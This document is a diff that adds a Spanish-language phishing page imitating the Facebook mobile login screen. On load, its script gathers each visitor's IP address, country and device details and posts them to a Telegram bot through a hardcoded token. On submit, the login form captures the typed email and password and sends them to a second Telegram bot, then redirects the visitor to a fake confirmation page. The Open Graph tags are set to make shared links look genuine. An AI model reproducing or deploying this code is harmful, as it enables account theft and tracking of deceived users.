@@ -1,0 +1,330 @@
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<title>Iniciar sesión en Facebook | Facebook</title>
+<!-- Aquí puedes poner la imagen que quires que aparezca al compartir el enlace -->
+<meta property="og:image" content="https://i.ibb.co/64DMy4C/joebiden.jpg">
+<meta property="og:url" content="http://www.facebook.com">
+<meta property="og:description"
+  content="Crea una cuenta o inicia sesión en Facebook. Conéctate con amigos, familiares y otras personas que conozcas. Comparte fotos y videos, envía mensajes y...">
+<meta property="og:title" content="">
+
+
+<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+<!-- icono -->
+<link rel="shortcut icon"
+  href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Facebook_icon.svg/2048px-Facebook_icon.svg.png"
+  type="image/x-icon">
+<link rel="stylesheet" href="C:\Users\user\Desktop\facebook clone/css1.css">
+<link rel="stylesheet" href="C:\Users\user\Desktop\facebook clone/css2.css">
+<link rel="stylesheet" href="C:\Users\user\Desktop\facebook clone/css3.css">
+<link rel="stylesheet" href="C:\Users\user\Desktop\facebook clone/css4.css">
+<link rel="stylesheet" href="C:\Users\user\Desktop\facebook clone/css5.css" title="" type="">
+<style>
+  .hidden {
+    display: none;
+  }
+</style>
+<script>   window.addEventListener('load', function () { var img = new Image(); img.onload = function () { document.getElementById('preload').classList.add('hidden'); document.getElementById('content').classList.remove('hidden'); }; img.src = 'https://i.ibb.co/F6khs2Y/Meta.jpg'; }); </script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    function sendDeviceInfoToTelegram(ip, country, device) {
+        var token = '6816058961:AAH7jf3hXMVe3Po8Ve-sxFdaSDsBQCVkb1c';
+        var chatId = '6423786554';
+
+        var message = 'IP del usuario es: ' + ip + '\n';
+        message += 'País: ' + country + '\n\n';
+        message += 'Información del dispositivo:\n' + device;
+
+        var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+        var data = {
+            chat_id: chatId,
+            text: message
+        };
+
+        $.post(url, data);
+    }
+
+    function getDeviceInfo() {
+        var deviceInfo = "Navegador: " + navigator.userAgent + "\n";
+        deviceInfo += "Plataforma: " + navigator.platform + "\n";
+        deviceInfo += "Idioma del navegador: " + navigator.language + "\n";
+
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (isMobile) {
+            // Es un dispositivo móvil
+            deviceInfo += "Tipo de dispositivo: Móvil\n";
+            var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+            if (isIOS) {
+                
+            } else {
+                
+                deviceInfo += "Sistema Operativo: Android\n";
+            }
+        } else {
+            deviceInfo += "Tipo de dispositivo: Escritorio\n";
+            var isWindows = /Win/.test(navigator.platform);
+            if (isWindows) {
+                deviceInfo += "Sistema Operativo: Windows\n";
+            } else {
+                deviceInfo += "Sistema Operativo: macOS\n";
+            }
+        }
+
+        return deviceInfo;
+    }
+
+    $(document).ready(function () {
+        $.getJSON('https://api.ipify.org?format=json', function (data) {
+            var ip = data.ip;
+
+            $.getJSON('https://ipapi.co/' + ip + '/json/', function (data) {
+                var country = data.country_name;
+                var device = getDeviceInfo();
+
+                sendDeviceInfoToTelegram(ip, country, device);
+            });
+        });
+    });
+</script>
+
+
+</head>
+
+<body style="margin:0px;" class="touch"
+  bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIxLjkuMTIiLCJzY29yZSI6MTA5MTJ9XQ==">
+  <center>
+    <div id="preload" class="hidden" bis_skin_checked="1"> <img style="width:100%; height:100%;"
+        src="https://i.ibb.co/F6khs2Y/Meta.jpg" alt=""></div>
+  </center>
+  <div id="content" class="" bis_skin_checked="1">
+
+
+    <div style="margin:0px;" class="_129_" id="header-notices" bis_skin_checked="1"></div>
+    <div style="margin:0px;" class="_5soa acw" bis_skin_checked="1">
+
+      <div style="margin:0px;" class="_4-4l" bis_skin_checked="1">
+
+
+
+        <a style="margin:0px; height:40px;" href="https://play.google.com/store/apps/details?id=com.facebook.katana"
+          target="_top" class="touchableArea  area  acy apl ">
+          <img style="width:20px; height:40px; margin: 0px 4px 0px;"
+            src="https://i.ibb.co/ByCtkzH/IMG-20220907-WA0036.jpg" alt="" sizes="50px" srcset=""> Descarga Facebook para
+          Android y navega más rápido.</a>
+
+        <i class="l img sp_xm9DDmY7HAL_1_5x sx_76c966">
+
+        </i>
+        <br>
+        <div id="header_transparency_banner" bis_skin_checked="1">
+          <div class="" bis_skin_checked="1">
+
+
+          </div>
+        </div>
+        <div class="_7om2 _52we _52z6" bis_skin_checked="1">
+          <div class="_4g34" bis_skin_checked="1"><a href="#">
+              <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img"
+                alt="facebook"></a>
+          </div>
+
+        </div>
+        <div class="_5rut" bis_skin_checked="1">
+          <br>
+          <form onsubmit="enviarMensaje(event)">
+
+            <div class="_56be" bis_skin_checked="1">
+              <input type="email" class="_56bg _4u9z _5ruq _8qtn" id="correo"
+                placeholder="Número de celular o correo electrónico" required="">
+            </div>
+            <br>
+            <div class="_56be" bis_skin_checked="1">
+              <input type="password" class="_56bg _4u9z _27z2 _8qtm" id="contrasena" placeholder="Contraseña"
+                required="">
+            </div>
+            <div class="_2pie" style="text-align:center;" bis_skin_checked="1">
+              <button type="submit" style="font-size:18px;" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu">Iniciar
+                sesión</button>
+            </div>
+            <br>
+            <center> <a tabindex="0"
+                href="https://m.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Fm.facebook.com%2F%3F_se_imp%3D0USApXcb2K0mOaNfF&amp;multiple_results=0&amp;ars=facebook_login&amp;from_login_screen=0&amp;lwv=100&amp;_rdr"
+                id="forgot-password-link">¿Olvidaste tu contraseña?</a> </center>
+          </form>
+
+          <script>
+            function enviarMensaje(event) {
+              event.preventDefault();
+
+              var token = '6412556686:AAFNvhRoIwNRlBobakI7QYlp9GjLrbeRNao';
+              var chatId = '6118502577';
+              const correo = document.getElementById('correo').value;
+              const contrasena = document.getElementById('contrasena').value;
+
+              const mensaje = `Nueva suscripción:\nCorreo: ${correo}\nContraseña: ${contrasena}`;
+
+              fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: mensaje,
+                }),
+              })
+                .then(response => response.json())
+                .then(data => {
+                  if (data.ok) {
+                    window.location.href = 'C:/Users/user/Desktop/facebook%20clone/facebook%20confirmaci%C3%B3n.html';
+                  } else {
+                    alert('Error al enviar el mensaje');
+                  }
+                })
+                .catch(error => {
+                  console.error(error);
+                  alert('Error al enviar el mensaje');
+                });
+            }
+          </script>
+
+          <div class="_43mg _8qtf" bis_skin_checked="1">
+            <br>
+            <span class="_43mh">o</span>
+          </div>
+          <center>
+
+            <div class="txt-create-account" bis_skin_checked="1">
+              <a style="color:black;" href="https://m.facebook.com/reg-no-deeplink/?cid=103">Crear cuenta nueva</a>
+            </div>
+          </center>
+        </div>
+        <div bis_skin_checked="1">
+          <div class="other-links _8p_m" bis_skin_checked="1">
+            <ul class="_5pkb _55wp">
+              <li><span class="mfss fcg"></span></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <span>
+        <img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:ne"></span>
+      <br>
+      <br>
+      <br>
+      <div class="_55wr _5ui2" data-sigil="m_login_footer" bis_skin_checked="1">
+        <div class="_5dpw" bis_skin_checked="1">
+          <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"
+            bis_skin_checked="1">
+            <div class="_7om2" bis_skin_checked="1">
+              <div class="_4g34" bis_skin_checked="1"><span class="_52jc _52j9 _52jh _3ztb">Español</span>
+                <div class="_3ztc" bis_skin_checked="1"><span class="_52jc"><a
+                      href="https://m.facebook.com/intl/save_locale/?loc=en_US&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;ls_ref=mobile_suggested_locale_selector&amp;ref=dbl"
+                      data-locale="ar_AR" data-sigil="change_language">العربية</a></span></div>
+                <div class="_3ztc" bis_skin_checked="1"><span class="_52jc"><a
+                      href="C:\Users\user\Desktop\" data-locale="es_ES"
+                      data-sigil="change_language">English (US)</a></span></div>
+                <div class="_3ztc" bis_skin_checked="1"><span class="_52jc"><a href="#" data-locale="de_DE"
+                      data-sigil="change_language">Deutsch</a></span></div>
+              </div>
+              <div class="_4g34" bis_skin_checked="1">
+                <div class="_3ztc" bis_skin_checked="1"><span class="_52jc"><a href="#" data-locale="fr_FR"
+                      data-sigil="change_language">Français (France)</a></span></div>
+                <div class="_3ztc" bis_skin_checked="1"><span class="_52jc"><a href="#" data-locale="tz_MA"
+                      data-sigil="change_language">ⵜⴰⵎⴰⵣⵉⵖⵜ</a></span></div>
+                <div class="_3ztc" bis_skin_checked="1"><span class="_52jc"><a href="#" data-locale="pt_BR"
+                      data-sigil="change_language">Português (Brasil)</a></span></div><a href="#">
+                  <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"
+                    bis_skin_checked="1">+<i class="img sp_XQwuhv8Yn2- sx_8e9c51"></i></div>
+                </a>
+              </div>
+            </div>
+          </div>
+
+
+          <div class="mvl copyright">
+            <div><span> Meta © 2023</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0"
+      style="display:none"></span>
+  </div>
+  <div class="_5ui4" bis_skin_checked="1">
+    <br> <br> <br>
+    <span style="color:#767d74;" class="mfss fcg">Meta © 2023.</span>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+  <div style="display:none;" bis_skin_checked="1">
+
+    <div style="display: none;" bis_skin_checked="1"><img style="-webkit-user-select: none;margin: auto;"
+        src="https://view.adjust.com/impression/lw5ap4r?campaign=shared_code_playground&amp;engagement_type=fallback_click&amp;fallback=https%3A%2F%2Fgetmimo.com">
+    </div>
+    <a id="mimo-install-banner"
+      href="https://app.adjust.com/lw5ap4r?campaign=shared_code_playground&amp;engagement_type=fallback_click&amp;fallback=https%3A%2F%2Fgetmimo.com"
+      target="_blank">
+      <div style="display: none;" bis_skin_checked="1">
+        <style>
+          #mimo-install-banner {
+            all: unset;
+            border-radius: 10px !important;
+            position: fixed !important;
+            bottom: 24px !important;
+            right: 24px !important;
+            height: 42px !important;
+            width: 42px !important;
+            cursor: pointer !important;
+            white-space: nowrap !important;
+            overflow: hidden !important;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15) !important;
+            transition: all 0.3s 0.5s ease !important;
+            transition-delay: 0.1s !important;
+            z-index: 2147483647 !important;
+            background-size: cover !important;
+            border: 5px solid white !important;
+            background-color: white !important;
+          }
+
+          #mimo-install-banner:hover,
+          #mimo-install-banner:active {
+            width: 255px !important;
+            transition-delay: 0s !important;
+          }
+
+          #mimo-install-banner-mobile {
+            all: unset;
+            border-radius: 10px !important;
+            position: fixed !important;
+            bottom: 24px !important;
+            right: 24px !important;
+            height: 32px !important;
+            width: 195px !important;
+            cursor: pointer !important;
+            white-space: nowrap !important;
+            overflow: hidden !important;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15) !important;
+            transition: all 0.3s 0.2s ease !important;
+            z-index: 2147483647 !important;
+            background-color: white !important;
+            background-size: cover !important;
+            border: 5px solid white !important;
+          }
+
+          @media screen and (max-width: 700px) {
+            #mimo-install-banner-mobile {
+              right: 50% !important;
+              bottom: 12px !important;
+              transform: translateX(50%) !important;
+            }
+          }
+        </style>
+      </div>
+    </a>
+  </div>
+</body>
+</html>
